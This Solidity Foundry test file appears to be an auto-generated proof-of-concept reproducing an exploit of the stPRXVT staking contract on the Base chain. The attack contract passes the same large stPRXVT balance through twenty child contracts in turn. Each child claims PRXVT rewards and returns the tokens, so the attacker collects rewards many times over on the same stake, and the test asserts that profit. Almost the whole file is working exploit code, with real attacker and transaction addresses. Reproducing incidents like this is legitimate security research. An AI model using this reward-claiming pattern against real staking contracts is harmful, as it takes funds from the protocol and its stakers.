// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x7407f9bdc4140d5e284ea7de32a9de6037842f45
// Attack Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Vulnerable Contract : 0x702980b1ed754c214b79192a4d7c39106f19bce9
// Attack Tx : 0x88610208c00f5d5ca234e45205a01199c87cb859f881e8b35297cba8325a5494
// Block : 40230828
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 40230827;
    uint256 constant TX_TIMESTAMP = 1767251003;
    uint256 constant TX_BLOCK_NUMBER = 40230828;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), Addresses.attack_child);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchChildRuntimes();
        attack.bindAttackChildContracts();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _etchChildRuntimes() internal {
        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_F8F4, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_8754, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_4327, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_6E05, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_41C0, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_EA60, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_7225, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1083, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_A3C8, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_69A9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_82C9, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_002A, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_AF0E, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_C97F, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_1651, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_9CAE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_CFF2, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_87FE, type(AttackChild).runtimeCode);
        vm.etch(Addresses.attack_child_410C, type(AttackChild).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.PRXVT, "PRXVT", 206765939449912147200000);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    AttackChild public attackChild_1;
    AttackChild public attackChild_2;
    AttackChild public attackChild_3;
    AttackChild public attackChild_4;
    AttackChild public attackChild_5;
    AttackChild public attackChild_6;
    AttackChild public attackChild_7;
    AttackChild public attackChild_8;
    AttackChild public attackChild_9;
    AttackChild public attackChild_10;
    AttackChild public attackChild_11;
    AttackChild public attackChild_12;
    AttackChild public attackChild_13;
    AttackChild public attackChild_14;
    AttackChild public attackChild_15;
    AttackChild public attackChild_16;
    AttackChild public attackChild_17;
    AttackChild public attackChild_18;
    AttackChild public attackChild_19;

    function deployAttackChildContracts() external returns (address) {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
        }
        if (address(attackChild_1) == address(0)) {
            attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
        }
        if (address(attackChild_2) == address(0)) {
            attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
        }
        if (address(attackChild_3) == address(0)) {
            attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
        }
        if (address(attackChild_4) == address(0)) {
            attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
        }
        if (address(attackChild_5) == address(0)) {
            attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
        }
        if (address(attackChild_6) == address(0)) {
            attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
        }
        if (address(attackChild_7) == address(0)) {
            attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
        }
        if (address(attackChild_8) == address(0)) {
            attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
        }
        if (address(attackChild_9) == address(0)) {
            attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
        }
        if (address(attackChild_10) == address(0)) {
            attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
        }
        if (address(attackChild_11) == address(0)) {
            attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
        }
        if (address(attackChild_12) == address(0)) {
            attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
        }
        if (address(attackChild_13) == address(0)) {
            attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
        }
        if (address(attackChild_14) == address(0)) {
            attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
        }
        if (address(attackChild_15) == address(0)) {
            attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
        }
        if (address(attackChild_16) == address(0)) {
            attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
        }
        if (address(attackChild_17) == address(0)) {
            attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
        }
        if (address(attackChild_18) == address(0)) {
            attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
        }
        if (address(attackChild_19) == address(0)) {
            attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
        }
        return address(attackChild);
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
            attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
            attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
            attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
            attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
            attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
            attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
            attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
            attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
            attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
            attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
            attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
            attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
            attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
            attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
            attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
            attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
            attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
            attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
            attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
        }
        _runStakeCycle(attackChild_2, 3);
        _runStakeCycle(attackChild_19, 20);
        _runStakeCycle(attackChild_11, 12);
        _runStakeCycle(attackChild_6, 7);
        _runStakeCycle(attackChild_3, 4);
        _runStakeCycle(attackChild_9, 10);
        _runStakeCycle(attackChild_16, 17);
        _runStakeCycle(attackChild_1, 2);
        _runStakeCycle(attackChild_5, 6);
        _runStakeCycle(attackChild_13, 14);
        _runStakeCycle(attackChild_4, 5);
        _runStakeCycle(attackChild_17, 18);
        _runStakeCycle(attackChild_15, 16);
        _runStakeCycle(attackChild_18, 19);
        _runStakeCycle(attackChild_7, 8);
        _runStakeCycle(attackChild_12, 13);
        _runStakeCycle(attackChild_8, 9);
        _runStakeCycle(attackChild_10, 11);
        _runStakeCycle(attackChild_14, 15);
        _runStakeCycle(attackChild, 1);
    }

    function _executeStakeCycles() internal {
        _runStakeCycle(attackChild_2, 3);
        _runStakeCycle(attackChild_19, 20);
        _runStakeCycle(attackChild_11, 12);
        _runStakeCycle(attackChild_6, 7);
        _runStakeCycle(attackChild_3, 4);
        _runStakeCycle(attackChild_9, 10);
        _runStakeCycle(attackChild_16, 17);
        _runStakeCycle(attackChild_1, 2);
        _runStakeCycle(attackChild_5, 6);
        _runStakeCycle(attackChild_13, 14);
        _runStakeCycle(attackChild_4, 5);
        _runStakeCycle(attackChild_17, 18);
        _runStakeCycle(attackChild_15, 16);
        _runStakeCycle(attackChild_18, 19);
        _runStakeCycle(attackChild_7, 8);
        _runStakeCycle(attackChild_12, 13);
        _runStakeCycle(attackChild_8, 9);
        _runStakeCycle(attackChild_10, 11);
        _runStakeCycle(attackChild_14, 15);
        _runStakeCycle(attackChild, 1);
    }

    function _runStakeCycle(AttackChild child, uint256 cycle) internal {
        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
        require(address(child).code.length != 0, "attack child runtime missing");
        _prepareChild(child, cycle);
        IERC20Like(Addresses.stPRXVT).transfer(address(child), 2300000000000000000000000);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
        child.execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        IERC20Like(Addresses.PRXVT).balanceOf(address(this));
    }

    function _prepareChild(AttackChild child, uint256 cycle) internal {
        if (cycle == 1) child._prepareAttackChild();
        else if (cycle == 2) child._prepareAttackChild2();
        else if (cycle == 3) child._prepareAttackChild3();
        else if (cycle == 4) child._prepareAttackChild4();
        else if (cycle == 5) child._prepareAttackChild5();
        else if (cycle == 6) child._prepareAttackChild6();
        else if (cycle == 7) child._prepareAttackChild7();
        else if (cycle == 8) child._prepareAttackChild8();
        else if (cycle == 9) child._prepareAttackChild9();
        else if (cycle == 10) child._prepareAttackChild1();
        else if (cycle == 11) child._prepareAttackChil2();
        else if (cycle == 12) child._prepareAttackChil3();
        else if (cycle == 13) child._prepareAttackChil4();
        else if (cycle == 14) child._prepareAttackChil5();
        else if (cycle == 15) child._prepareAttackChil6();
        else if (cycle == 16) child._prepareAttackChil7();
        else if (cycle == 17) child._prepareAttackChil8();
        else if (cycle == 18) child._prepareAttackChil9();
        else if (cycle == 19) child._prepareAttackChil10();
        else if (cycle == 20) child._prepareAttackChil11();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xe6d7db7e) {
            _executeStakeCycles();
            bytes memory ret = abi.encode(0x00000000000000000007e6C50cBf628949b22F00, uint256(1824));
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
        attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
        attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
        attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
        attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
        attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
        attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
        attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
        attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
        attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
        attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
        attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
        attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
        attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
        attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
        attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
        attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
        attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
        attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
        attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }
}

contract AttackChild {
    receive() external payable {}

    function execute(address stakingToken, address rewardToken, address profitRecipient) external payable {
        if (address(this) == 0x1915e1d705A16fb0555183d8035A40B4D7b08754) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x34659264a5772fB78328BC2458aFA602De0c4327) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x4Ae6813D2303389b4eE340a4203018b7D55A41C0) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x3731aB4Bf5411E83f0284e977cC957C470b06E05) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xbB565626B6107542A07235DaC741082a9A3e1651) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x8f328440FEa42b3f5c19eF267b308D928171002A) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x67588894D086634BD399F8bC6A8e98399B841083) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x83fEF8e277Ae519B6cCB247771704b72679769A9) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0xB43d98418c5A5863f1a96c2917164d074ff4c97f) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        if (address(this) == 0x04021252a55fd6E012f96350EB28820FD2f01048) {
            _claimRewards(stakingToken, rewardToken, profitRecipient);
            return;
        }
        _claimRewards(stakingToken, rewardToken, profitRecipient);
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        _entryCb();
    }

    function attackChildCb3() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb20() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb12() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb7() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb4() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb10() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb17() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb2() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb6() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb14() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb5() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb18() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb16() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb19() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb8() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb13() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb9() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb11() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb15() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function attackChildCb() external payable {
        _claimRewards(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
        return;
    }

    function _entryCb() internal {}

    function _claimRewards(address stakingToken, address rewardToken, address profitRecipient) internal {
        IstPRXVT(stakingToken).earned(address(this));
        IstPRXVT(stakingToken).claimReward();
        IERC20Like(stakingToken).balanceOf(address(this));
        IERC20Like(stakingToken).transfer(profitRecipient, 2300000000000000000000000);
        IERC20Like(rewardToken).balanceOf(address(this));
        IERC20Like(rewardToken).transfer(profitRecipient, 10338296972495607360000);
    }

    function _prepareAttackChild() public {}
    function _prepareAttackChild1() public {}
    function _prepareAttackChild2() public {}
    function _prepareAttackChild3() public {}
    function _prepareAttackChild4() public {}
    function _prepareAttackChild5() public {}
    function _prepareAttackChild6() public {}
    function _prepareAttackChild7() public {}
    function _prepareAttackChild8() public {}
    function _prepareAttackChild9() public {}
    function _prepareAttackChil2() public {}
    function _prepareAttackChil3() public {}
    function _prepareAttackChil4() public {}
    function _prepareAttackChil5() public {}
    function _prepareAttackChil6() public {}
    function _prepareAttackChil7() public {}
    function _prepareAttackChil8() public {}
    function _prepareAttackChil9() public {}
    function _prepareAttackChil10() public {}
    function _prepareAttackChil11() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal constant attack_child = 0x04021252a55fd6E012f96350EB28820FD2f01048;
    address internal constant attack_child_F8F4 = 0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4;
    address internal constant attack_child_8754 = 0x1915e1d705A16fb0555183d8035A40B4D7b08754;
    address internal constant attack_child_4327 = 0x34659264a5772fB78328BC2458aFA602De0c4327;
    address internal constant attack_child_6E05 = 0x3731aB4Bf5411E83f0284e977cC957C470b06E05;
    address internal constant attack_child_41C0 = 0x4Ae6813D2303389b4eE340a4203018b7D55A41C0;
    address internal constant attack_child_EA60 = 0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60;
    address internal constant attack_child_7225 = 0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225;
    address internal constant attack_child_1083 = 0x67588894D086634BD399F8bC6A8e98399B841083;
    address internal constant attack_contract = 0x702980b1Ed754C214B79192a4D7c39106f19BcE9;
    address internal constant attacker_eoa = 0x7407f9bdc4140d5e284ea7De32A9De6037842f45;
    address internal constant attack_child_A3C8 = 0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8;
    address internal constant AgentTokenV2 = 0x7BaB5D2e3EbdE7293888B3f4c022aAAAD88Ae2db;
    address internal constant attack_child_69A9 = 0x83fEF8e277Ae519B6cCB247771704b72679769A9;
    address internal constant attack_child_82C9 = 0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9;
    address internal constant attack_child_002A = 0x8f328440FEa42b3f5c19eF267b308D928171002A;
    address internal constant attack_child_AF0E = 0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e;
    address internal constant attack_child_C97F = 0xB43d98418c5A5863f1a96c2917164d074ff4c97f;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attack_child_1651 = 0xbB565626B6107542A07235DaC741082a9A3e1651;
    address internal constant PRXVT = 0xC2FF2E5aa9023b1bb688178a4a547212f4614bc0;
    address internal constant attack_child_9CAE = 0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae;
    address internal constant stPRXVT = 0xDAc30a5e2612206E2756836Ed6764EC5817e6Fff;
    address internal constant attack_child_CFF2 = 0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2;
    address internal constant attack_child_87FE = 0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE;
    address internal constant attack_child_410C = 0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IstPRXVT {
    function claimReward() external;
    function earned(address) external view returns (uint256);
}
